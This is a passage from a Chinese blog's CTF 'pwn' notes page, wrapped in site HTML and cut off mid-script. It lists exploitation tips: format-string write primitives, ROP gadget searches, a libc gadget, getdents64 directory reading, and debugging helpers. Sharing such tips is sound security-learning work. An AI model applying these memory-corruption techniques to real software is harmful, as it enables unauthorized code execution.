@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PWN杂记 - </title><meta name="author" content="chuwei">
+<meta name="description" content="本文主要用于记录pwn题目的一些tips
+gdb.attach(p,&lsquo;b *0x40094c&rsquo;)
+b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数
+strings libc.so.6|grep ubuntu
+strings libc.so.6|grep libc 查看libc 版本信息
+strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时
+开启和关闭缓存区有什么区别
+开启的化printf 遇到\n才输出， 不开启 就直接输出
+%*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值
+%p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0
+finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。
+为了结束while的read循环while ( read(0, nptr, 0x10uLL) &gt; 0 )可以用p.shutdown(&#39;send&#39;)命令，不过不能再发送第二次了
+IDA 修复jmp rax
+https://bbs.pediy.com/thread-268245.htm
+https://blog.csdn.net/huzai9527/article/details/121204850
+"><meta name="keywords" content='杂记'>
+  <meta itemprop="name" content="PWN杂记">
+  <meta itemprop="description" content="本文主要用于记录pwn题目的一些tips
+gdb.attach(p,‘b *0x40094c’)
+b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数
+strings libc.so.6|grep ubuntu
+strings libc.so.6|grep libc 查看libc 版本信息
+strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时
+开启和关闭缓存区有什么区别
+开启的化printf 遇到\n才输出， 不开启 就直接输出
+%*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值
+%p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0
+finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。
+为了结束while的read循环while ( read(0, nptr, 0x10uLL) &gt; 0 )可以用p.shutdown(&#39;send&#39;)命令，不过不能再发送第二次了
+IDA 修复jmp rax
+https://bbs.pediy.com/thread-268245.htm
+https://blog.csdn.net/huzai9527/article/details/121204850">
+  <meta itemprop="datePublished" content="2025-01-04T23:41:43+08:00">
+  <meta itemprop="dateModified" content="2025-01-04T23:41:43+08:00">
+  <meta itemprop="wordCount" content="758">
+  <meta itemprop="image" content="https://chuw3i.github.io/logo.jpg">
+  <meta itemprop="keywords" content="杂记"><meta property="og:url" content="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/">
+  <meta property="og:title" content="PWN杂记">
+  <meta property="og:description" content="本文主要用于记录pwn题目的一些tips
+gdb.attach(p,‘b *0x40094c’)
+b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数
+strings libc.so.6|grep ubuntu
+strings libc.so.6|grep libc 查看libc 版本信息
+strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时
+开启和关闭缓存区有什么区别
+开启的化printf 遇到\n才输出， 不开启 就直接输出
+%*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值
+%p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0
+finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。
+为了结束while的read循环while ( read(0, nptr, 0x10uLL) &gt; 0 )可以用p.shutdown(&#39;send&#39;)命令，不过不能再发送第二次了
+IDA 修复jmp rax
+https://bbs.pediy.com/thread-268245.htm
+https://blog.csdn.net/huzai9527/article/details/121204850">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-04T23:41:43+08:00">
+    <meta property="article:modified_time" content="2025-01-04T23:41:43+08:00">
+    <meta property="article:tag" content="杂记">
+    <meta property="og:image" content="https://chuw3i.github.io/logo.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://chuw3i.github.io/logo.jpg">
+  <meta name="twitter:title" content="PWN杂记">
+  <meta name="twitter:description" content="本文主要用于记录pwn题目的一些tips
+gdb.attach(p,‘b *0x40094c’)
+b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数
+strings libc.so.6|grep ubuntu
+strings libc.so.6|grep libc 查看libc 版本信息
+strings elf | grep GCC 查看libc 信息 但是不一定对，当编译环境和运行环境不一样时
+开启和关闭缓存区有什么区别
+开启的化printf 遇到\n才输出， 不开启 就直接输出
+%*6$c %7$n相当于%addr c %7$n *6为格式化字符串第六个参数中的值
+%p%10$n 前面已经输出的字符 是%p那里的值，比如0x7f60847b55a0
+finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return 命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return 命令还有一个功能，即可以指定该函数的返回值。
+为了结束while的read循环while ( read(0, nptr, 0x10uLL) &gt; 0 )可以用p.shutdown(&#39;send&#39;)命令，不过不能再发送第二次了
+IDA 修复jmp rax
+https://bbs.pediy.com/thread-268245.htm
+https://blog.csdn.net/huzai9527/article/details/121204850">
+<meta name="application-name" content="chuwei的小站">
+<meta name="apple-mobile-web-app-title" content="chuwei的小站"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" type="text/html" href="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/" title="PWN杂记 - " /><link rel="prev" type="text/html" href="https://chuw3i.github.io/about/" title="About" /><link rel="next" type="text/html" href="https://chuw3i.github.io/friends/" title="Index" /><link rel="alternate" type="text/markdown" href="https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/index.md" title="PWN杂记 - "><link rel="stylesheet" href="/css/style.min.e75a1276ae546554656b4f72023ebcd3a621958228b37b84bebef5d1127b2279.css" integrity="sha256-51oSdq5UZVRla09yAj6806YhlYIos3uEvr710RJ7Ink="><link rel="preload" href="/lib/fontawesome-free/all.min.3cc0b2bc9e0e07c346863f1b57891f62d9f9d8aee7c60e391891b0e23f641a21.css" integrity="sha256-PMCyvJ4OB8NGhj8bV4kfYtn52K7nxg45GJGw4j9kGiE=" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.3cc0b2bc9e0e07c346863f1b57891f62d9f9d8aee7c60e391891b0e23f641a21.css" integrity="sha256-PMCyvJ4OB8NGhj8bV4kfYtn52K7nxg45GJGw4j9kGiE="></noscript><link rel="preload" href="/lib/animate/animate.min.a61e123314188bd0453320008e01b4bbb665bee09039f4cbd9bef44de410ce67.css" integrity="sha256-ph4SMxQYi9BFMyAAjgG0u7ZlvuCQOfTL2b70TeQQzmc=" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.a61e123314188bd0453320008e01b4bbb665bee09039f4cbd9bef44de410ce67.css" integrity="sha256-ph4SMxQYi9BFMyAAjgG0u7ZlvuCQOfTL2b70TeQQzmc="></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PWN杂记",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/chuw3i.github.io\/posts\/pwn%E6%9D%82%E8%AE%B0\/"
+    },"genre": "posts","keywords": "杂记","wordcount":  758 ,
+    "url": "https:\/\/chuw3i.github.io\/posts\/pwn%E6%9D%82%E8%AE%B0\/","datePublished": "2025-01-04T23:41:43+08:00","dateModified": "2025-01-04T23:41:43+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "chuwei"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.15fc6d693c4ea1331dfdbe98e8c76402340195b0a3b4047378cec39b7c827bfa.js" integrity="sha256-FfxtaTxOoTMd/b6Y6MdkAjQBlbCjtARzeM7Dm3yCe/o="></script></head>
+  <body data-header-desktop="auto" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title=""><img class="logo" src='/logo.jpg' alt="/logo.jpg" height="32" width="32"><span class="header-title-text">chuwei的博客</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 归档</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title=""><img class="logo" src='/logo.jpg' alt="/logo.jpg" height="26" width="26"><span class="header-title-text">chuwei的博客</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 归档</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"><div class="details collection-details open">
+      <div class="details-summary collection-summary">
+        <i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i>
+        <span class="collection-name" title="合集">Pwn</span>
+        <span class="collection-count">3</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
+      <div class="details-content collection-content">
+        <nav>
+          <ul class="collection-list"><li class="collection-item"><a href="/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/" title="LLVM_PASS_PWN_学习">LLVM_PASS_PWN_学习</a></li><li class="collection-item"><a href="/posts/stack-challenge/" title="Stack Challenge">Stack Challenge</a></li><li class="collection-item"><span class="active" title="PWN杂记">PWN杂记</span></li></ul>
+          <div class="collection-nav-simple"><a href="/posts/stack-challenge/" class="collection-nav-item" rel="prev" title="Stack Challenge"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i></a><span class="text-secondary">3/3</span><i class="fa-solid fa-angle-right fa-fw collection-nav-item text-secondary" aria-hidden="true"></i></div>
+        </nav>
+      </div>
+    </div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PWN杂记</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='logo.jpg' alt="chuwei" height="16" width="16">&nbsp;chuwei</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pwn/" class="post-category" title="分类 - Pwn"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a> 和 <a href="/collections/pwn/" class="post-collection" title="合集 - Pwn"><i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i> Pwn</a></span></div><div class="post-meta-line"><span title="发布于 2025-01-04 23:41:43"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-01-04">2025-01-04</time></span>&nbsp;<span title="758 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>本文主要用于记录pwn题目的一些tips</p>
+<ul>
+<li>
+<p>gdb.attach(p,&lsquo;b *0x40094c&rsquo;)</p>
+</li>
+<li>
+<p>b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数</p>
+</li>
+<li>
+<p>strings libc.so.6|grep ubuntu</p>
+</li>
+<li>
+<p>strings libc.so.6|grep libc  查看libc 版本信息</p>
+</li>
+<li>
+<p>strings elf | grep GCC  查看libc 信息 但是不一定对，当编译环境和运行环境不一样时</p>
+</li>
+<li>
+<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202208022057067.png' alt="image-20220725100823523"></p>
+</li>
+<li>
+<p>开启和关闭缓存区有什么区别</p>
+<p>开启的化printf 遇到\n才输出， 不开启 就直接输出</p>
+</li>
+<li>
+<p><code>%*6$c %7$n</code>相当于<code>%addr c %7$n</code>  *6为格式化字符串第六个参数中的值</p>
+</li>
+<li>
+<p>%p%10$n 前面已经输出的字符 是%p那里的值，比如<code>0x7f60847b55a0</code></p>
+</li>
+<li>
+<p>finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return  命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return  命令还有一个功能，即可以指定该函数的返回值。</p>
+</li>
+<li>
+<p>为了结束while的read循环<code>while ( read(0, nptr, 0x10uLL) &gt; 0 )</code>可以用<code>p.shutdown('send')</code>命令，不过不能再发送第二次了</p>
+</li>
+<li>
+<p>IDA 修复jmp rax</p>
+<blockquote>
+<p><a href="https://bbs.pediy.com/thread-268245.htm"target="_blank" rel="external nofollow noopener noreferrer">https://bbs.pediy.com/thread-268245.htm<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://blog.csdn.net/huzai9527/article/details/121204850"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/huzai9527/article/details/121204850<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p><a href="https://www.jianshu.com/p/cc0bc578b951"target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/cc0bc578b951<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p></blockquote>
+</li>
+<li>
+<p>IO_flush_all_lockp函数触发条件：</p>
+<ol>
+<li>当libc执行abort流程时 abort可以通过触发malloc_printerr来触发</li>
+<li>当执行exit函数时</li>
+<li>当执行流从main函数返回时</li>
+</ol>
+</li>
+<li>
+<p>一个gadget,暂时不知道有什么用，先记录一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">i</span> <span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">26</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf09931a</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x48</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf09931e</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">30</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf099322</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;:</span>    <span class="n">lea</span>    <span class="n">r13</span><span class="p">,[</span><span class="n">rbp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf099326</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf09932d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">45</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">r13</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7f5cdf099330</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>    <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x28</span><span class="p">]</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>一个将泄露出16进制的flag字符串转换的小脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;flag{afffd8-e4-25-c73ec9b075-18008fbf}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">=</span><span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="p">:</span><span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>       <span class="c1">#32位泄露出的是4字节，64位是8字节</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>将泄露出的小端序数据转换为字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">byte_str</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0xa&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;byte_str==&#34;</span><span class="p">,</span><span class="n">byte_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bytes_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">byte_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bytes_data</span><span class="o">=</span><span class="n">bytes_data</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">bytes_data</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span><span class="o">=</span><span class="n">string</span><span class="o">+</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">bytes_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">string</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>patchelf 报错修复：https://zikh26.github.io/posts/8cbdee5a.html#patch-libc%E5%92%8Cld%E8%BF%87%E7%A8%8B</p>
+<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303142111516.png' alt="image-20230118224539165"></p>
+</li>
+<li>
+<p>set context-output /dev/pts/2  方便调试</p>
+</li>
+<li>
+<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303012036068.png' alt="image-20230301203618437"></p>
+</li>
+<li>
+<p>在flag文件名未知的情况下无法构造常规orw来读取</p>
+<p>这时候可以利用getdents64函数，它读取目录文件中的一个个目录项并返回</p>
+<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303142111422' alt="img"></p>
+<p><a href="https://blog.csdn.net/cnbird2008/article/details/11629095"target="_blank" rel="external nofollow noopener noreferrer">参考：ls命令是怎样实现的，getdents64，linux-2.6.27.5<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</li>
+<li>
+<p><a href="https://github.com/Naetw/CTF-pwn-tips"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Naetw/CTF-pwn-tips<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>  一些小tips</p>
+</li>
+<li>
+<p><code>libc.search(asm('pop rdi;ret;')).__next__()</code>  搜索libc中的gadgets</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rax&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>查看fs段寄存器：<code>p/x $fs_base</code></p>
+</li>
+<li>
+<p>某些情况下patchelf 需要将 libc.so.6 设置为绝对路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6   ./libc-2.32.so ./elf</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>strcpy 会将结束符<code>\x00</code>copy到目标字符串，strlen遇到<code>'\x00'</code>截止</p>
+</li>
+<li>
+<p>qemu 调试异架构</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">killport</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;root authority is required&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">command</span><span class="o">=</span><span class="s2">&#34;kill -9 $(netstat -nlp | grep :&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34; | awk &#39;{print $7}&#39; | awk -F&#39;/&#39; &#39;{{ print $1 }}&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">attach_payload</span> <span class="o">=</span><span class="s2">&#34;&#34;&#34;
